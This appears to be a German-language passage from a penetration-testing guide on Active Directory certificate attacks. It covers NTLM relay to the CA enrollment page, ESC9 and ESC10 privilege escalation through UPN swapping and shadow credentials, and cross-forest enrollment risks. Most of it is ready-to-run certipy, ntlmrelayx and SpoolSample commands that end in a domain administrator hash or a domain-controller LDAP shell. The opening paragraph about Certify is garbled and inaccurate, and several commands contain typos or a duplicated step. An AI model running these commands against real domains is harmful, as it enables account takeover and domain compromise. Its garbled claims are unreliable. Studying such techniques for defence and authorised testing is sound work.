Um Certify zu verwenden, müssen Sie zuerst das Zertifikat des Zielbenutzers erhalten. Dies kann durch verschiedene Methoden erreicht werden, wie z.B. das Abfangen des Zertifikats während des TLS-Handshakes oder das Extrahieren des Zertifikats aus dem Windows-Zertifikatsspeicher des Benutzers.

Sobald Sie das Zertifikat des Zielbenutzers haben, können Sie Certify verwenden, um ein neues Zertifikat zu erstellen, das die gleichen Anmeldeinformationen enthält. Dieses neue Zertifikat kann dann verwendet werden, um sich als der Zielbenutzer auszugeben und auf Ressourcen zuzugreifen, für die der Zielbenutzer berechtigt ist.

Es ist wichtig zu beachten, dass Certify administrative Berechtigungen erfordert, um erfolgreich zu funktionieren. Daher ist es in der Regel nicht möglich, Certify in einer gehärteten Active Directory-Umgebung zu missbrauchen. Es ist jedoch immer wichtig, die Sicherheit von Zertifikaten in einer Domäne zu überwachen und sicherzustellen, dass sie nicht kompromittiert werden.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Anforderung eines Zertifikats erfolgt standardmäßig durch Certipy basierend auf der Vorlage `Machine` oder `User`, die anhand des Endes des übermittelten Kontonamens (`$`) bestimmt wird. Die Angabe einer alternativen Vorlage kann durch die Verwendung des Parameters `-template` erreicht werden.

Eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) kann dann verwendet werden, um eine Authentifizierung zu erzwingen. Bei der Arbeit mit Domänencontrollern ist die Angabe von `-template DomainController` erforderlich.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Keine Sicherheitserweiterung - ESC9 <a href="#5485" id="5485"></a>

### Erklärung

Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, auch bekannt als ESC9, verhindert die Einbettung der **neuen `szOID_NTDS_CA_SECURITY_EXT` Sicherheitserweiterung** in einem Zertifikat. Diese Flagge wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` (Standardwert) gesetzt ist, im Gegensatz zu einer Einstellung von `2`. Ihre Bedeutung wird in Szenarien erhöht, in denen eine schwächere Zertifikatsumsetzung für Kerberos oder Schannel ausgenutzt werden könnte (wie bei ESC10), da die Abwesenheit von ESC9 die Anforderungen nicht ändern würde.

Die Bedingungen, unter denen die Einstellung dieser Flagge bedeutend wird, sind:
- `StrongCertificateBindingEnforcement` ist nicht auf `2` eingestellt (Standardwert ist `1`), oder `CertificateMappingMethods` enthält die `UPN`-Flagge.
- Das Zertifikat ist mit der `CT_FLAG_NO_SECURITY_EXTENSION`-Flagge in der Einstellung `msPKI-Enrollment-Flag` markiert.
- Das Zertifikat enthält eine beliebige Client-Authentifizierungs-EKU.
- Über ein beliebiges Konto sind `GenericWrite`-Berechtigungen verfügbar, um ein anderes Konto zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` hat `GenericWrite`-Berechtigungen über `Jane@corp.local` und das Ziel besteht darin, `Administrator@corp.local` zu kompromittieren. Die Zertifikatvorlage `ESC9`, in die sich `Jane@corp.local` einschreiben darf, ist mit der `CT_FLAG_NO_SECURITY_EXTENSION`-Flagge in ihrer Einstellung `msPKI-Enrollment-Flag` konfiguriert.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials erlangt, dank `Johns` `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird der `userPrincipalName` von `Jane` absichtlich auf `Administrator` geändert, wobei der Domänenanteil `@corp.local` weggelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Änderung verstößt nicht gegen die Einschränkungen, vorausgesetzt, dass `Administrator@corp.local` als `userPrincipalName` von `Administrator` weiterhin eindeutig bleibt.

Anschließend wird die als gefährdet markierte Zertifikatvorlage `ESC9` als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es ist zu beachten, dass das Zertifikat `userPrincipalName` den Wert `Administrator` aufweist, ohne eine "object SID".

Das `userPrincipalName` von `Jane` wird dann auf ihren ursprünglichen Wert `Jane@corp.local` zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem ausgestellten Zertifikat liefert nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss `-domain <domain>` enthalten, da das Zertifikat keine Domänenspezifikation aufweist:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Schwache Zertifikat-Zuordnungen - ESC10

### Erklärung

Zwei Registrierungsschlüsselwerte auf dem Domänencontroller werden von ESC10 verwendet:

- Der Standardwert für `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ist `0x18` (`0x8 | 0x10`), zuvor auf `0x1F` gesetzt.
- Die Standardkonfiguration für `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ist `1`, zuvor `0`.

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` als `0` konfiguriert ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Mit der Konfiguration von `StrongCertificateBindingEnforcement` als `0` kann ein Konto A mit `GenericWrite`-Berechtigungen ausgenutzt werden, um ein beliebiges Konto B zu kompromittieren.

Beispielsweise kann ein Angreifer, der über `GenericWrite`-Berechtigungen für `Jane@corp.local` verfügt, versuchen, `Administrator@corp.local` zu kompromittieren. Das Verfahren ähnelt ESC9 und ermöglicht die Verwendung beliebiger Zertifikatvorlagen.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials abgerufen, indem `GenericWrite` ausgenutzt wird.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird der `userPrincipalName` von `Jane` absichtlich in `Administrator` geändert, wobei der Teil `@corp.local` bewusst weggelassen wird, um eine Verletzung der Einschränkung zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Im Anschluss wird ein Zertifikat zur Aktivierung der Client-Authentifizierung als `Jane` angefordert, unter Verwendung der Standardvorlage `Benutzer`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`s `userPrincipalName` wird dann auf seinen ursprünglichen Wert `Jane@corp.local` zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`. Aufgrund des Fehlens von Domänendetails im Zertifikat ist es erforderlich, die Domäne in dem Befehl anzugeben.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Mit den `CertificateMappingMethods`, die das `UPN`-Bitflag (`0x4`) enthalten, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, das über keine `userPrincipalName`-Eigenschaft verfügt, einschließlich Maschinenkonten und des integrierten Domänenadministrators `Administrator`.

Das Ziel besteht darin, `DC$@corp.local` zu kompromittieren, indem wir zunächst den Hash von `Jane` über Shadow Credentials erhalten und dabei `GenericWrite` ausnutzen.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Es wird ein Zertifikat für die Client-Authentifizierung als `Jane` unter Verwendung der Standardvorlage `Benutzer` angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`s `userPrincipalName` wird nach diesem Vorgang auf den ursprünglichen Wert zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Um sich über Schannel zu authentifizieren, wird die Option `-ldap-shell` von Certipy verwendet, die den Erfolg der Authentifizierung als `u:CORP\DC$` anzeigt.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Durch die LDAP-Shell können Befehle wie `set_rbcd` Resource-Based Constrained Delegation (RBCD)-Angriffe ermöglichen, die potenziell den Domänencontroller gefährden.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch Benutzerkonten, die keine `userPrincipalName` haben oder bei denen sie nicht mit dem `sAMAccountName` übereinstimmt. Das Standardkonto `Administrator@corp.local` ist aufgrund seiner erhöhten LDAP-Berechtigungen und dem Fehlen einer `userPrincipalName` standardmäßig ein Hauptziel.

## Kompromittierung von Forests durch Zertifikate im passiven Modus erklärt

Die Konfiguration für die **Cross-Forest-Registrierung** ist relativ einfach. Das **Root-CA-Zertifikat** aus dem Ressourcen-Forest wird von Administratoren an die Konten-Forests **veröffentlicht** und die **Enterprise-CA-Zertifikate** aus dem Ressourcen-Forest werden den Containern `NTAuthCertificates` und AIA in jedem Konten-Forest **hinzugefügt**. Um es klar auszudrücken, gewährt diese Anordnung der **CA im Ressourcen-Forest die vollständige Kontrolle** über alle anderen Forests, für die sie PKI verwaltet. Wenn diese CA von Angreifern **kompromittiert** wird, können Zertifikate für alle Benutzer sowohl in den Ressourcen- als auch in den Konten-Forests von ihnen **gefälscht werden**, wodurch die Sicherheitsgrenze des Forests durchbrochen wird.

### Registrierungsrechte für externe Prinzipale

In Multi-Forest-Umgebungen ist Vorsicht geboten bei Enterprise-CAs, die **Zertifikatvorlagen veröffentlichen**, die es **Authentifizierten Benutzern oder externen Prinzipalen** (Benutzern/Gruppen außerhalb des Forests, zu dem die Enterprise-CA gehört) ermöglichen, **Registrierungs- und Bearbeitungsrechte** zu haben.\
Nach der Authentifizierung über eine Vertrauensstellung wird die **SID der Authentifizierten Benutzer** von AD dem Token des Benutzers hinzugefügt. Wenn also eine Domäne eine Enterprise-CA mit einer Vorlage besitzt, die **Authentifizierten Benutzern Registrierungsrechte ermöglicht**, könnte eine Vorlage potenziell von einem Benutzer aus einem anderen Forest **registriert werden**. Ebenso wird, wenn **Registrierungsrechte explizit einem externen Prinzipal durch eine Vorlage gewährt werden**, eine **Cross-Forest-Zugriffssteuerungsbeziehung erstellt**, die es einem Prinzipal aus einem Forest ermöglicht, sich in einer Vorlage aus einem anderen Forest **zu registrieren**.

Beide Szenarien führen zu einer **Erhöhung der Angriffsfläche** von einem Forest zum anderen. Die Einstellungen der Zertifikatvorlage könnten von einem Angreifer ausgenutzt werden, um zusätzliche Berechtigungen in einer fremden Domäne zu erlangen.
